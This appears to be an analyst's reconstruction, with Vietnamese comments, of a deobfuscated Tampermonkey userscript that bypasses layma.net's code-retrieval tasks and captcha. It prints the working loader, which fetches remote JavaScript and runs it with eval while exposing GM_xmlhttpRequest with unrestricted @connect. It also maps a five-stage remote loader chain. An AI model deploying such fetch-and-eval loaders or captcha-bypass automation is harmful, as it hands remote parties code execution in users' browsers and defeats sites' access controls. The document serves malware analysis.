// ============================================================================
//  RECONSTRUCTED ORIGINAL SOURCE — funcion.js (toàn bộ phần code gốc thật)
//  Khôi phục bằng cách deobfuscate 100% (sandbox decoder + constant-fold + AST),
//  sau đó loại bỏ toàn bộ mã do obfuscator sinh ra (máy giải mã chuỗi RC4/base64,
//  wrapper offset, anti-debug, self-defending, console-disable).
//  Toàn bộ funcion.js sau khi bỏ "lớp giáp" chỉ còn đúng logic dưới đây.
// ============================================================================

// ==UserScript==
// @name         Layma.net Bypass - CUTTAY PROMAX
// @namespace    http://tampermonkey.net/
// @version      1.1.4
// @description  Auto nhiệm vụ lấy mã
// @author       DuckXkurumi
// @icon         https://files.catbox.moe/8p9l8w.jpg
// @match        https://layma.net/*
// @connect      *
// @grant        GM_xmlhttpRequest
// @grant        unsafeWindow
// @run-at       document-end
// @require      https://duckxkurumi.xyz/bypass/layma/funcion.js
// @updateURL    https://duckxkurumi.xyz/bypass/layma/userscript.user.js
// @downloadURL  https://duckxkurumi.xyz/bypass/layma/userscript.user.js
// ==/UserScript==

// funcion.js KHÔNG chứa logic bypass. Nó chỉ là loader nhiều tầng:
fetch("https://duckxkrmproject.x10.mx/layma.js?t=" + Date.now())
  .then((response) => response.text())
  .then((code) => {
    // Chia sẻ GM_xmlhttpRequest cho code chạy trong trang (vì @connect *)
    window.GM_xmlhttpRequest = GM_xmlhttpRequest;
    try {
      unsafeWindow.GM_xmlhttpRequest = GM_xmlhttpRequest;
    } catch (e) {}
    // Thực thi payload tải về (stage 2)
    eval(code);
  })
  .catch((error) => console.error("Lỗi khi tải script:", error));

/* ============================================================================
 * CHUỖI TẢI (loader chain) phát hiện được:
 *
 *  [1] userscript.user.js  (header @require funcion.js)
 *      └─ [2] https://duckxkurumi.xyz/bypass/layma/funcion.js
 *             (loader + obfuscator.io anti-debug; fetch + eval ↓)
 *      └─ [3] https://duckxkrmproject.x10.mx/layma.js   (~202KB, obfuscator kiểu
 *             Jscrambler/JSVMP: string TEA-encrypt runtime, control-flow flatten)
 *             (fetch + eval ↓ — URL pastefy được decrypt lúc chạy)
 *      └─ [4] https://pastefy.app/5dKBHbgv/raw          (~197KB, cùng kiểu)
 *             (fetch + eval ↓)
 *      └─ [5] https://pastefy.app/6ZzLL87y/raw          (~211KB, JSVMP thật sự
 *             — mã bytecode + interpreter, 0 chuỗi plain-text)
 *
 *  Hành vi stage-5 (quan sát trong sandbox, stub DOM giả, KHÔNG chạm trang thật):
 *   - Đọc các hàm API của chính trang layma.net: g, deps, getQCaptchaToken,
 *     getTokenId, getCampainId, getVisitorInfo, getVisitorUUID, uuidv4,
 *     trafficSessionToken, res, getReferrer, AUTO_CHANGE_MISSION_ON_ERROR
 *   - Tìm main#guide, tạo #vnbypass-wrapper, #vnbypass-clean-style
 *   - Dò #qcaptcha-checkcode, #native-override-captcha-box,
 *     #native-override-button-box  → tự động hóa nghiệm vụ lấy mã / qua captcha
 *   - Gọi getVisitorInfo() của trang
 *
 *  Kết luận: đây là script "bypass nhiệm vụ" cho layma.net, tự động hoá captcha
 *  qcaptcha bằng cách gọi lại API nội bộ của chính trang, auto-click/điền và
 *  nhận mã mở khoá chương. Cập nhật logic từ xa qua pastefy.app (dán + sửa thoải mái,
 *  không cần phát hành lại userscript).
 * ==========================================================================*/
